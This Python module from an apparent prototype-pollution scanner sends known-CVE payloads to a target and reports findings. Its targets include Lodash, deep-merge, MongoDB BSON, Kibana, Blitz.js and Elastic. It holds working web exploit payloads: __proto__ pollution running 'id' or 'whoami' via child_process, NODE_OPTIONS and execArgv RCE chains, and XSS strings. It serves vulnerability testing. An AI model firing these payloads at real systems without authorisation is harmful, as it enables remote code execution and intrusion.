"""
ppmap/scanner/tier6_cve.py - Tier 6: Specific CVE Payload Testing

Tests for known public CVEs utilizing Prototype Pollution / Gadget chains:
    - Lodash (_.unset, _.omit, _.merge)
    - @75lb/deep-merge
    - Protobufjs
    - Safe-eval, Dset, MongoDB BSON, Akamai BoT, ETA, TypeORM
    - XML2JS (parseString)
    - Kibana Telemetry (HackerOne #852613)
    - Blitz.js (CVE-2022-23631)
    - Elastic XSS (HackerOne #998398)

Extracted from: scanner/core.py lines 3749–4376
"""

import json
import time
import logging
from typing import Any, Dict, List

from ppmap.models.findings import Finding, Severity, VulnerabilityType
from ppmap.scanner.base import BaseTierScanner, ScanContext
from ppmap.scanner.helpers import Colors, progress_iter

logger = logging.getLogger(__name__)


class Tier6CVEScanner(BaseTierScanner):
    """Specific CVE payload testing for Prototype Pollution."""

    @property
    def tier_name(self) -> str:
        return "Tier 6 - Specific CVEs"

    def run(self, ctx: ScanContext) -> List[Finding]:
        self.log_start(ctx)
        raw_dicts: List[Dict[str, Any]] = []

        raw_dicts += self._test_cve_specific_payloads(ctx)
        raw_dicts += self._test_kibana_telemetry_rce(ctx)
        raw_dicts += self._test_blitzjs_rce_chain(ctx)
        raw_dicts += self._test_elastic_xss(ctx)

        findings = [self._to_finding(r, ctx.target_url) for r in raw_dicts]
        if not findings:
            self.log_clean()
        return findings

    # ──────────────────────────────────────────────────────────────────────────

    def _test_cve_specific_payloads(self, ctx: ScanContext) -> List[Dict[str, Any]]:
        """
        [Phase 2] CVE-Specific Payload Testing (Lodash, deep-merge, protobufjs, etc).
        Includes XML2JS XML-based prototype pollution testing.
        """
        print(f"{Colors.BOLD}[→] Testing CVE-Specific Payloads...{Colors.ENDC}")
        findings: List[Dict[str, Any]] = []
        session = ctx.session
        target_url = ctx.target_url

        try:
            from ppmap.payloads import SSPP_RCE_GADGETS
        except ImportError:
            SSPP_RCE_GADGETS = []

        cve_tests = [
            {
                "cve": "Lodash _.unset Injection Gadget",
                "library": "Lodash", "method": "_.unset / _.omit",
                "payload": '{"constructor":{"prototype":{"polluted":"LODASH_UNSET_INJECTION"}}}',
                "detection": ["lodash", "_.unset", "_.omit"], "severity": "HIGH",
            },
            {
                "cve": "CVE-2024-38986", "library": "@75lb/deep-merge", "method": "deepMerge",
                "payload": '{"__proto__":{"shell":"vim","input":":!whoami\\n"}}',
                "detection": ["deep-merge", "deepmerge"], "severity": "CRITICAL",
            },
            {
                "cve": "CVE-2020-8203", "library": "Lodash", "method": "_.merge",
                "payload": '{"__proto__":{"isAdmin":true,"role":"admin"}}',
                "detection": ["lodash", "_.merge"], "severity": "HIGH",
            },
            {
                "cve": "CVE-2022-25878", "library": "Protobufjs", "method": "parse",
                "payload": '{"__proto__":{"toString":"function(){return \\"PPMAP_PROTO\\"}"}}',
                "detection": ["protobuf", "protobufjs"], "severity": "HIGH",
            },
            {
                "cve": "CVE-2022-25904", "library": "Safe-eval", "method": "safeEval",
                "payload": '{"constructor":{"prototype":{"toString":"[Function: PPMAP]"}}}',
                "detection": ["safe-eval", "safeEval"], "severity": "CRITICAL",
            },
            {
                "cve": "CVE-2022-25645", "library": "Dset", "method": "dset",
                "payload": '{"__proto__.polluted":"CVE-2022-25645"}',
                "detection": ["dset"], "severity": "MEDIUM",
            },
            {
                "cve": "MongoDB BSON evalFunctions RCE", "library": "MongoDB BSON", "method": "deserialize",
                "payload": '{"__proto__":{"evalFunctions":true,"$where":"require(\\\"child_process\\\").exec(\\\"id\\\")","polluted":"PPMAP_PROTO"}}',
                "detection": ["bson", "mongodb"], "severity": "CRITICAL",
            },
            {
                "cve": "Akamai BoT Management XSS", "library": "Akamai", "method": "BoT Client-Side",
                "payload": '{"__proto__":{"ak_bmsc":"<img src=x onerror=alert(1)><!-- PPMAP_PROTO -->"}}',
                "detection": ["akamai", "_cf_chl_opt"], "severity": "HIGH",
            },
            {
                "cve": "CVE-2022-25967", "library": "ETA Template", "method": "Render",
                "payload": '{"__proto__":{"varName":"x=console.log(1); // PPMAP_PROTO"}}',
                "detection": ["eta"], "severity": "CRITICAL",
            },
            {
                "cve": "TypeORM Auth Bypass PP", "library": "TypeORM", "method": "Object Parameter",
                "payload": '{"__proto__":{"where":{"1":"1","PPMAP":"PPMAP_PROTO"}}}',
                "detection": ["typeorm"], "severity": "HIGH",
            },
            {
                "cve": "CVE-2023-36665", "library": "Protobufjs (v2023)", "method": "Parse",
                "payload": '{"__proto__":{"__idic__": "PPMAP_PROTO"}}',
                "detection": ["protobuf", "protobufjs"], "severity": "HIGH",
            },
        ]

        for g_name, g_payload, g_desc in SSPP_RCE_GADGETS:
            cve_tests.append({
                "cve": f"RCE Gadget: {g_desc}",
                "library": g_name.split("_")[0].title(), "method": "Gadget Chain",
                "payload": json.dumps(g_payload),
                "detection": [g_name.split("_")[0]], "severity": "CRITICAL",
            })

        try:
            initial_resp = session.get(target_url, timeout=5, verify=False)
            page_content = initial_resp.text.lower()

            detected_cves = [t for t in cve_tests if any(ind.lower() in page_content for ind in t["detection"])]
            for test in detected_cves:
                print(f"{Colors.CYAN}[*] Detected {test['library']} - Testing {test['cve']}{Colors.ENDC}")

            test_list = detected_cves if detected_cves else cve_tests
            for test in progress_iter(test_list, desc="CVE Tests"):
                try:
                    resp = session.post(target_url, data=test["payload"], headers={"Content-Type": "application/json"}, timeout=5, verify=False)
                    if resp.status_code < 400 and any(ind in resp.text for ind in [test["cve"], "PPMAP_PROTO"]):
                        findings.append({
                            "type": "cve_specific",
                            "method": f'CVE_{test["cve"].replace("-", "_")}',
                            "severity": test["severity"],
                            "cve": test["cve"],
                            "library": test["library"],
                            "vulnerable_method": test["method"],
                            "payload": test["payload"],
                            "description": f'{test["cve"]} - {test["library"]} {test["method"]} vulnerability',
                            "reference": f'refrensi.md - {test["cve"]}',
                        })
                        print(f"{Colors.FAIL}[!] {test['severity']}: {test['cve']} vulnerability detected!{Colors.ENDC}")
                    elif resp.status_code == 500:
                        findings.append({
                            "type": "cve_specific_potential", "method": f'CVE_{test["cve"].replace("-", "_")}_POTENTIAL',
                            "severity": "MEDIUM", "cve": test["cve"],
                            "description": f'Potential {test["cve"]} - Server error on payload', "payload": test["payload"],
                        })
                        print(f"{Colors.WARNING}[!] Potential {test['cve']} (500 error){Colors.ENDC}")
                except Exception:
                    continue

            # XML2JS Test
            try:
                print(f"{Colors.BLUE}[→] Testing XML parsers (xml2js) for prototype pollution...{Colors.ENDC}")
                xml_payload = "<__proto__><polluted>true</polluted></__proto__>"
                xml_resp = session.post(target_url, data=xml_payload, headers={"Content-Type": "application/xml"}, timeout=5, verify=False)
                if xml_resp.status_code == 500:
                    findings.append({"type": "cve_specific_potential", "method": "XML2JS_PARSE_ERROR", "severity": "MEDIUM", "description": "Potential xml2js PP (500 error)"})
                    print(f"{Colors.WARNING}[!] Potential xml2js prototype pollution (500 error){Colors.ENDC}")
                elif "polluted" in xml_resp.text:
                    findings.append({
                        "type": "cve_specific", "method": "XML2JS_POLLUTION", "severity": "HIGH",
                        "description": "XML to JSON object parsing pollution discovered", "payload": xml_payload
                    })
                    print(f"{Colors.FAIL}[!] HIGH: xml2js XML prototype pollution detected!{Colors.ENDC}")
            except Exception:
                pass

            if findings:
                print(f"{Colors.GREEN}[✓] Found {len(findings)} CVE-specific issue(s){Colors.ENDC}")

        except Exception as e:
            print(f"{Colors.WARNING}[⚠] CVE test error: {str(e)[:80]}{Colors.ENDC}")

        return findings

    def _test_kibana_telemetry_rce(self, ctx: ScanContext) -> List[Dict[str, Any]]:
        """Kibana Telemetry RCE (HackerOne #852613)"""
        print(f"{Colors.BOLD}[→] Testing Kibana Telemetry RCE (HackerOne #852613)...{Colors.ENDC}")
        findings: List[Dict[str, Any]] = []
        session = ctx.session
        target_url = ctx.target_url

        kibana_payloads = [
            {"payload": '{"path":"__proto__.env.NODE_OPTIONS","value":"--require /proc/self/environ"}', "impact": "RCE via NODE_OPTIONS"},
            {"payload": '{"path":"constructor.prototype.shell","value":"vim"}', "impact": "Shell override"},
            {"payload": '{"__proto__":{"execArgv":["--eval=require(\\"child_process\\").execSync(\\"id\\")"]}', "impact": "RCE via execArgv"},
        ]

        try:
            resp = session.get(target_url, timeout=5, verify=False)
            if "kibana" in resp.text.lower() or "elastic" in resp.text.lower():
                print(f"{Colors.CYAN}[*] Kibana/Elastic detected - Running targeted tests{Colors.ENDC}")

            for test in progress_iter(kibana_payloads, desc="Kibana RCE"):
                try:
                    r = session.post(target_url, data=test["payload"], headers={"Content-Type": "application/json", "kbn-xsrf": "true"}, timeout=5, verify=False)
                    if r.status_code < 400 and any(ind in r.text for ind in ["PPMAP_RCE", "kbn-xsrf"]):
                        findings.append({
                            "type": "kibana_telemetry_rce", "method": "KIBANA_TELEMETRY_RCE", "severity": "CRITICAL",
                            "impact": test["impact"], "payload": test["payload"], "description": "Kibana Telemetry Collector RCE via Lodash _.set",
                        })
                        print(f"{Colors.FAIL}[!] CRITICAL: Kibana Telemetry RCE detected!{Colors.ENDC}")
                except Exception:
                    continue
        except Exception:
            pass
        return findings

    def _test_blitzjs_rce_chain(self, ctx: ScanContext) -> List[Dict[str, Any]]:
        """Blitz.js RCE Chain (CVE-2022-23631)"""
        print(f"{Colors.BOLD}[→] Testing Blitz.js RCE Chain (CVE-2022-23631)...{Colors.ENDC}")
        findings: List[Dict[str, Any]] = []
        session = ctx.session
        target_url = ctx.target_url

        payloads = [
            {"payload": '{"json":{"__proto__":{"ppmap_shell":"vim"}},"meta":{"values":{"__proto__":["class"]}}}', "impact": "RCE via shell"},
            {"payload": '{"json":{"constructor":{"prototype":{"ppmap_execArgv":["--eval=console.log(1)"]}}},"meta":{}}', "impact": "RCE via execArgv"},
        ]

        try:
            resp = session.get(target_url, timeout=5, verify=False)
            if "blitz" in resp.text.lower() or "superjson" in resp.text.lower():
                print(f"{Colors.CYAN}[*] Blitz.js/superjson detected - Running targeted tests{Colors.ENDC}")

            for test in progress_iter(payloads, desc="Blitz.js RCE"):
                try:
                    r = session.post(target_url, data=test["payload"], headers={"Content-Type": "application/json"}, timeout=5, verify=False)
                    if r.status_code < 400 and any(i in r.text for i in ["ppmap_shell", "ppmap_execArgv"]):
                        findings.append({
                            "type": "blitzjs_rce_chain", "method": "BLITZJS_RCE_CHAIN", "severity": "CRITICAL",
                            "payload": test["payload"], "description": "Blitz.js superjson RCE chain",
                        })
                        print(f"{Colors.FAIL}[!] CRITICAL: Blitz.js RCE Chain detected!{Colors.ENDC}")
                except Exception:
                    continue
        except Exception:
            pass
        return findings

    def _test_elastic_xss(self, ctx: ScanContext) -> List[Dict[str, Any]]:
        """Elastic XSS (HackerOne #998398)"""
        print(f"{Colors.BOLD}[→] Testing Elastic XSS (HackerOne #998398)...{Colors.ENDC}")
        findings: List[Dict[str, Any]] = []
        session = ctx.session
        driver = ctx.driver
        target_url = ctx.target_url

        payloads = [
            ("?__proto__[innerHTML]=<img src=x onerror=alert(document.domain)>", "DOM_XSS", "<img src=x onerror=alert(document.domain)>"),
            ('?__proto__[outerHTML]=<script>alert("PPMAP_ELASTIC_XSS")</script>', "REFLECTED", '<script>alert("PPMAP_ELASTIC_XSS")</script>'),
            ("?constructor[prototype][onclick]=alert(1)", "EVENT_HANDLER", "alert(1)"),
        ]

        try:
            resp = session.get(target_url, timeout=5, verify=False)
            if "elastic" in resp.text.lower() or "kibana" in resp.text.lower():
                print(f"{Colors.CYAN}[*] Elastic/Kibana detected - Running XSS tests{Colors.ENDC}")

            for payload, impact, expected_str in progress_iter(payloads, desc="Elastic XSS"):
                try:
                    payload_qs = payload.lstrip("?")
                    sep = "&" if "?" in target_url else "?"
                    test_url = f"{target_url}{sep}{payload_qs}"
                    r = session.get(test_url, timeout=5, verify=False)

                    if r.status_code < 400 and expected_str in r.text and "text/html" in r.headers.get("Content-Type", ""):
                        finding = {
                            "type": "elastic_xss", "method": "ELASTIC_XSS", "severity": "HIGH",
                            "description": "Elastic XSS via PP", "payload": payload, "test_url": test_url
                        }
                        print(f"{Colors.FAIL}[!] HIGH: Elastic XSS detected!{Colors.ENDC}")

                        # Browser verification
                        if driver:
                            try:
                                driver.get(test_url)
                                time.sleep(1)
                                if driver.switch_to.alert.text:
                                    print(f"{Colors.FAIL}[!] CRITICAL: Browser Confirmed XSS Execution!{Colors.ENDC}")
                                    driver.switch_to.alert.accept()
                                    finding["severity"] = "CRITICAL"
                                    finding["description"] += " (Verified)"
                            except Exception:
                                pass
                        findings.append(finding)
                except Exception:
                    continue
        except Exception:
            pass
        return findings

    # ──────────────────────────────────────────────────────────────────────────

    @staticmethod
    def _to_finding(raw: Dict[str, Any], url: str) -> Finding:
        severity_map = {
            "CRITICAL": Severity.CRITICAL, "HIGH": Severity.HIGH,
            "MEDIUM": Severity.MEDIUM, "LOW": Severity.LOW,
        }
        return Finding(
            name=raw.get("description", raw.get("type", "PP Finding")),
            severity=severity_map.get(raw.get("severity", "MEDIUM"), Severity.MEDIUM),
            type=VulnerabilityType.PROTOTYPE_POLLUTION,
            url=raw.get("test_url", url),
            method=raw.get("method", ""),
            payload=str(raw.get("payload", "")),
            evidence=str(raw.get("cve", raw.get("library", ""))),
            description=raw.get("description", ""),
        )
